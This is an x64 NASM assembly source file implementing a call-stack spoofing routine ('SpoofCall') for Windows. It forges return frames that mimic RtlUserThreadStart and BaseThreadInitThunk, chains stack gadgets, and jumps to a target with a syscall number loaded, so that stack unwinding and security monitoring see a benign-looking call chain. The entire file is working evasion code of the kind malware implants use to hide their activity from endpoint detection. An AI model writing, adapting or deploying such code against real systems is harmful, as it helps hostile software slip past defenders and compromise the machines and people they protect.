; nasm -f win64 spoofer.asm -o spoofer.o
BITS 64
DEFAULT REL

;              +=======================================================================+ <--- Higher Memory
;              | Caller's Return Address                                               | [Entry RSP]
;              +-----------------------------------------------------------------------+
;              | Saved RBP                                                             | [RBP]
;              +-----------------------------------------------------------------------+
;              | Saved R15                                                             | [RBP - 0x08]
;              | Saved R14                                                             | [RBP - 0x10]
;              | Saved R13                                                             | [RBP - 0x18]
;              | Saved R12                                                             | [RBP - 0x20]
;              | Saved RDI                                                             | [RBP - 0x28]
;              | Saved RSI                                                             | [RBP - 0x30]
;              | Saved RBX (Holds pointer to gadget_fallback)                          | [RBP - 0x38]
;              +=======================================================================+
;              |                                                                       |
;              | Spoofed Frame 1 Allocation                                            | Size: Spoofed1StackSize
;              | (Simulates RtlUserThreadStart local variables / shadow space)         |
;              |                                                                       |
;              +-----------------------------------------------------------------------+
;              | pSpoofed1_ret (Return to RtlUserThreadStart + 0x31)                   | 
;              +=======================================================================+
;              |                                                                       |
;              | Spoofed Frame 2 Allocation                                            | Size: Spoofed2StackSize
;              | (Simulates BaseThreadInitThunk local variables / shadow space)        | 
;              |                                                                       |
;              +-----------------------------------------------------------------------+
;              | pSpoofed2_ret (Return to BaseThreadInitThunk + 0x20)                  | 
;              +=======================================================================+
;              | Optional Padding (0 or 8 bytes)                                       | Dynamic ABI alignment
;              +-----------------------------------------------------------------------+
;              | pJmpRbxGadget (Secondary return, hit after 'add rsp, X')              | <--- Unwinder stops here
;              +=======================================================================+ <--- RSP + AddRspSize
;              | Stack Argument N                                                      | 
;              | ...                                                                   | Size: AddRspSize 
;              | Stack Argument 5                                                      | [RSP + 0x28]
;              +-----------------------------------------------------------------------+
;              | Shadow Space (Home for Arg 4 / R9)                                    | [RSP + 0x20]
;              | Shadow Space (Home for Arg 3 / R8)                                    | [RSP + 0x18]
;              | Shadow Space (Home for Arg 2 / RDX)                                   | [RSP + 0x10]
;              | Shadow Space (Home for Arg 1 / RCX)                                   | [RSP + 0x08]
;              +-----------------------------------------------------------------------+
;              | pAddRspRetGadget (Primary return address for the Target function)     | [RSP] <--- CURRENT RSP 
;              +=======================================================================+ <--- Lower Memory

struc STACK_CONFIG
    .pSpoofed1_ret:      RESQ 1
    .Spoofed1StackSize:  RESQ 1
    .pSpoofed2_ret:      RESQ 1
    .Spoofed2StackSize:  RESQ 1
    .pJmpRbxGadget:      RESQ 1
    .pAddRSPRetGadget:   RESQ 1
    .AddRspSize:         RESQ 1
    .pTarget:            RESQ 1
    .pArgs:              RESQ 1
    .dwNumberOfArgs:     RESQ 1
    .ssn:                RESQ 1
endstruc

global SpoofCall

section .text
SpoofCall:
    push rbp             ; Save caller's RBP
    mov rbp, rsp         ; Establish our own stack frame

    ; Save non-volatile regs
    push r15
    push r14
    push r13
    push r12
    push rdi
    push rsi
    push rbx             ; pushed 0x38 offset from RBP

    mov r13, rcx                    ; r13 = stackConfig

    ; End unwinding of RtlVirtualUnwind
    ;push 0

    ; === Frame 1 : RtlUserThreadStart ===
    mov r10, [r13 + STACK_CONFIG.Spoofed1StackSize]
    sub rsp, r10
    mov r10, [r13 + STACK_CONFIG.pSpoofed1_ret]
    push r10

    ; === Frame 2 : BaseThreadInitThunk ===
    mov r10, [r13 + STACK_CONFIG.Spoofed2StackSize]
    sub rsp, r10
    mov r10, [r13 + STACK_CONFIG.pSpoofed2_ret]
    push r10

    ; We check if the stack will be aligned after all the stack manipulations
    mov r10, rsp
    sub r10, 8  ; push pJmpRbxGadget
    mov r11, [r13 + STACK_CONFIG.AddRspSize]
    sub r10, r11 ; sub rsp, AddRspSize

    and r10, 0xF
    test r10, r10
    jz .aligned_ok
    sub rsp, 8                     ; Force rsp%16 == 0 after stack calculation
.aligned_ok:
    mov r10, [r13 + STACK_CONFIG.pJmpRbxGadget]
    push r10

    mov r10, [r13 + STACK_CONFIG.AddRspSize]
    sub rsp, r10                  ; Adjust stack for the final gadget (e.g., add rsp, X, ret)  

    ; Setup 4 first args
    mov rax, [r13 + STACK_CONFIG.pArgs]
    mov rcx, [rax + 0x00]           ; arg0
    mov rdx, [rax + 0x08]           ; arg1
    mov r8,  [rax + 0x10]           ; arg2
    mov r9,  [rax + 0x18]           ; arg3

    ; if more args than 4
    mov r11, [r13 + STACK_CONFIG.dwNumberOfArgs]
    sub r11, 4                      
    jle .setup_rbx                  

    ; TThis part is ignored cause will be included into AddRspSize to be cleaned up by the gadget fallback
    ;lea r12, [r11 * 8]
    ;add r12, 0x28                   ; shadow space + retaddr
    ;sub rsp, r12                    ; Save space for ABI call convention Shadow (0x20) + args

.stack_args_loop:
    dec r11
    mov r15, [rax + 0x20 + r11 * 8]  ; rax + 4*8 (= start of stack args) + index * size of arg 
    mov [rsp + 0x20 + r11 * 8], r15  ; rsp + shadow space (0x20) + index * size of arg
    test r11, r11
    jnz .stack_args_loop

.setup_rbx:
    mov r10, [r13 + STACK_CONFIG.pAddRSPRetGadget]
    push r10

    lea rbx, [rel gadget_fallback]

    mov r10, rcx
    mov eax, [r13 + STACK_CONFIG.ssn]
    mov r12, [r13 + STACK_CONFIG.pTarget]
    jmp r12

gadget_fallback:
    lea rsp, [rbp-0x38]         ; Clean up the stack 

    pop rbx
    pop rsi
    pop rdi
    pop r12
    pop r13
    pop r14
    pop r15
    
    pop rbp

    pop r11 
    jmp r11           ; not using ret to keep the flow hidden from RtlVitualUnwind